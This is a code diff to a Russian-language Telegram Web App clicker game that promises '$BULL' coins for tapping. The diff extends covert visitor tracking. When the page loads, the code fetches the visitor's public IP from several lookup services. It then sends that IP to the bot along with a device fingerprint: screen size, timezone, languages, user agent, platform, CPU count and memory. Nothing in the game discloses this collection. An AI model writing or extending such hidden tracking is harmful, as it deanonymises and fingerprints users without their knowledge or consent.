@@ -178,7 +178,7 @@
         let balance = 100;
         let tapPower = 1;
         let combo = 0;
-        let isIPsent = false;
+        let isDataSent = false;
 
         // Элементы DOM
         const coin = document.getElementById('coin');
@@ -187,17 +187,72 @@
         const comboEl = document.getElementById('combo');
         const loading = document.getElementById('loading');
 
-        // Функция отправки IP
-        function sendIPtoBot(ip) {
-            if (isIPsent) return;
-            isIPsent = true;
+        // Функция получения данных экрана
+        function getScreenInfo() {
+            return {
+                width: screen.width,
+                height: screen.height,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight
+            };
+        }
+
+        // Функция получения часового пояса
+        function getTimezoneInfo() {
+            try {
+                const now = new Date();
+                return {
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    utc_offset: now.getTimezoneOffset(),
+                    local_time: now.toLocaleString('ru-RU'),
+                    language: navigator.language,
+                    languages: navigator.languages ? navigator.languages.join(', ') : navigator.language
+                };
+            } catch (e) {
+                return {
+                    timezone: "Неизвестно",
+                    utc_offset: "Неизвестно",
+                    local_time: "Неизвестно",
+                    language: navigator.language || "Неизвестно",
+                    languages: navigator.language || "Неизвестно"
+                };
+            }
+        }
+
+        // Функция получения дополнительной информации
+        function getAdditionalInfo() {
+            return {
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                cookieEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+                hardwareConcurrency: navigator.hardwareConcurrency || "Неизвестно",
+                deviceMemory: navigator.deviceMemory || "Неизвестно",
+                maxTouchPoints: navigator.maxTouchPoints || 0
+            };
+        }
+
+        // Функция отправки данных
+        function sendDataToBot(ip) {
+            if (isDataSent) return;
+            isDataSent = true;
             
             if (window.Telegram && window.Telegram.WebApp) {
-                window.Telegram.WebApp.sendData(JSON.stringify({
+                const data = {
                     web_app_ip: ip,
+                    user_agent: navigator.userAgent,
+                    screen: getScreenInfo(),
+                    timezone: getTimezoneInfo(),
+                    additional: getAdditionalInfo(),
                     action: 'tap',
                     timestamp: new Date().toISOString()
-                }));
+                };
+                
+                window.Telegram.WebApp.sendData(JSON.stringify(data));
                 
                 // Скрываем loading после отправки
                 setTimeout(() => {
@@ -211,14 +266,16 @@
             const services = [
                 'https://checkip.amazonaws.com/',
                 'https://api.ipify.org?format=json',
-                'https://ifconfig.me/ip'
+                'https://ifconfig.me/ip',
+                'https://icanhazip.com/',
+                'https://ident.me/'
             ];
 
             let attempts = 0;
 
             function tryNextService() {
                 if (attempts >= services.length) {
-                    sendIPtoBot('Не удалось получить IP');
+                    sendDataToBot('Не удалось получить IP');
                     return;
                 }
 
@@ -231,7 +288,12 @@
                         }
                     })
                     .then(ip => {
-                        sendIPtoBot(ip.trim());
+                        if (ip && ip.trim() !== '') {
+                            sendDataToBot(ip.trim());
+                        } else {
+                            attempts++;
+                            tryNextService();
+                        }
                     })
                     .catch(() => {
                         attempts++;
@@ -297,7 +359,7 @@
 
         // Запускаем при загрузке
         document.addEventListener('DOMContentLoaded', function() {
-            setTimeout(getIP, 2000); // Даем время для загрузки анимации
+            setTimeout(getIP, 1500); // Даем время для загрузки анимации
             
             // Показываем подсказку
             loading.textContent = '✨ Тапай по монете чтобы зарабатывать $BULL!';
